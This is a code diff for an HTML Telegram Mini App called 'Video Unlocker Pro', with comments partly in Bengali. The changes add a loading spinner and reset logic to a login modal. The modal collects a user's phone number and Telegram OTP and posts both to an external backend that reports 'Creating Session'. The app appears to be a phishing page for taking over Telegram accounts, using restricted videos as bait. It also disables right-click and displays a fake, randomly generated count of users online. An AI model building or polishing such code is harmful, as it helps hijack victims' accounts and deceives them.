@@ -3,6 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- Cache Buster -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    
     <title>Video Unlocker Pro</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -56,6 +61,10 @@
         .login-input:focus { border-color: #00ffaa; }
         .mystery-fab { position: fixed; bottom: 25px; right: 15px; background: linear-gradient(135deg, #ff0055, #ffcc00); color: white; border-radius: 14px; padding: 12px 16px; font-size: 13px; font-weight: bold; box-shadow: 0 4px 15px rgba(255, 0, 85, 0.6); cursor: pointer; z-index: 99990; border: 2px solid #fff; display: flex; align-items: center; gap: 6px; animation: redPulse 2s infinite; }
         @keyframes redPulse { 0%, 100% { box-shadow: 0 4px 15px rgba(255, 0, 85, 0.6); transform: translateY(0); } 50% { box-shadow: 0 4px 25px rgba(255, 0, 85, 0.95); transform: translateY(-4px); } }
+        
+        /* CSS for Loading Spinner */
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #00ffaa; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -98,16 +107,27 @@
         <div class="video-card" style="background:#222;"></div>
     </div>
 
+    <!-- Login Modal -->
     <div class="modal" id="loginModal">
         <div class="modal-content">
             <h3 style="color: #00ffaa; margin-top: 0;">🔐 Link Telegram Account</h3>
             <p style="font-size: 11px; color: #ccc; margin-bottom: 20px;">Link your account to download restricted videos using your own identity.</p>
             
+            <!-- Number Input Section -->
             <div id="phone-sec">
                 <input type="text" id="phone-input" class="login-input" placeholder="e.g. 017XXXXXXXX">
                 <button class="share-btn" onclick="sendCode()">Send OTP Code</button>
             </div>
 
+            <!-- Loading Spinner Section -->
+            <div id="loading-sec" style="display: none; margin: 25px 0;">
+                <div class="spinner"></div>
+                <div id="loading-text" style="font-size:12px; color:#00ffaa; margin-top:12px; font-weight:bold; line-height: 1.5;">
+                    Connecting to Telegram API...<br>Please wait 5-10 seconds ⏳
+                </div>
+            </div>
+
+            <!-- OTP Input Section -->
             <div id="otp-sec" style="display: none;">
                 <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP (e.g. 12345)" style="letter-spacing: 5px;">
                 <button class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
@@ -131,7 +151,6 @@
         const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';
         const fetchHeaders = { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' };
 
-        // ইউজার আইডি বের করার সিকিউর পদ্ধতি
         let finalUserId = '';
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
             finalUserId = tg.initDataUnsafe.user.id;
@@ -143,15 +162,27 @@
         let dbRefcount = 0;
         let allVideos = [];
         let clickedAds = {};
-        
         let filterMode = 'all'; 
         let currentNeededRef = 3;
-
         let currentPhone = "";
         let currentHash = "";
 
-        function openLogin() { document.getElementById('loginModal').style.display = 'flex'; }
-        function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
+        function openLogin() { 
+            document.getElementById('loginModal').style.display = 'flex'; 
+        }
+
+        function closeLogin() { 
+            document.getElementById('loginModal').style.display = 'none'; 
+            
+            // Modal ক্লোজ করলে আবার সব রিসেট করে ডিফল্ট অবস্থায় নিয়ে যাওয়া হলো
+            setTimeout(() => {
+                document.getElementById('phone-sec').style.display = 'block';
+                document.getElementById('loading-sec').style.display = 'none';
+                document.getElementById('otp-sec').style.display = 'none';
+                document.getElementById('phone-input').value = '';
+                document.getElementById('otp-input').value = '';
+            }, 500);
+        }
 
         async function sendCode() {
             let rawPhone = document.getElementById('phone-input').value.trim().replace(/[-\s]/g, '');
@@ -164,14 +195,16 @@
             }
             currentPhone = rawPhone;
 
-            showToast("Requesting OTP for " + currentPhone + "...");
-            
+            // ১. ফোন সেকশন হাইড করে লোডিং স্পিনার শো করা হলো
+            document.getElementById('phone-sec').style.display = 'none';
+            document.getElementById('loading-sec').style.display = 'block';
+            document.getElementById('loading-text').innerHTML = "Connecting to Telegram API...<br>Please wait 5-10 seconds ⏳";
+
             try {
                 const urlWithTime = `${BACKEND_URL}/api/send_code?t=${new Date().getTime()}`;
                 const res = await fetch(urlWithTime, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    // এখানে ফাইনাল ইউজার আইডি পাঠানো হচ্ছে
                     body: JSON.stringify({ phone: currentPhone, user_id: finalUserId })
                 });
                 
@@ -179,14 +212,20 @@
                 
                 if(data.status === "ok") {
                     currentHash = data.hash;
-                    document.getElementById('phone-sec').style.display = 'none';
+                    // ২. সাকসেস হলে স্পিনার হাইড করে OTP পেজ শো করা হলো
+                    document.getElementById('loading-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
                     showToast("Code sent to your Telegram!");
                 } else { 
+                    // এরর হলে স্পিনার হাইড করে আবার ফোন পেজে ফেরত পাঠানো হলো
+                    document.getElementById('loading-sec').style.display = 'none';
+                    document.getElementById('phone-sec').style.display = 'block';
                     showToast("Error: " + data.msg); 
                 }
             } catch(e) { 
                 console.error(e);
+                document.getElementById('loading-sec').style.display = 'none';
+                document.getElementById('phone-sec').style.display = 'block';
                 showToast("Server error! Check internet."); 
             }
         }
@@ -194,7 +233,11 @@
         async function verifyCode() {
             const otp = document.getElementById('otp-input').value.trim();
             if(!otp) return showToast("Enter OTP!");
-            showToast("Verifying account...");
+            
+            // ১. OTP সেকশন হাইড করে আবার স্পিনার শো করা হলো
+            document.getElementById('otp-sec').style.display = 'none';
+            document.getElementById('loading-sec').style.display = 'block';
+            document.getElementById('loading-text').innerHTML = "Verifying & Creating Session...<br>Please wait a moment ⏳";
             
             try {
                 const urlWithTime = `${BACKEND_URL}/api/verify_code?t=${new Date().getTime()}`;
@@ -204,11 +247,21 @@
                     body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: finalUserId })
                 });
                 const data = await res.json();
+                
                 if(data.status === "ok") {
                     showToast("Account Linked Successfully! 🎉");
                     closeLogin();
-                } else { showToast("Invalid Code or Error!"); }
-            } catch(e) { showToast("Server connection error!"); }
+                } else { 
+                    // এরর হলে স্পিনার হাইড করে আবার OTP পেজে ফেরত পাঠানো হলো
+                    document.getElementById('loading-sec').style.display = 'none';
+                    document.getElementById('otp-sec').style.display = 'block';
+                    showToast("Error: " + data.msg); 
+                }
+            } catch(e) { 
+                document.getElementById('loading-sec').style.display = 'none';
+                document.getElementById('otp-sec').style.display = 'block';
+                showToast("Server connection error!"); 
+            }
         }
 
         setInterval(() => { document.getElementById('online-count').innerText = (1200 + Math.floor(Math.random() * 200)).toLocaleString(); }, 4000);
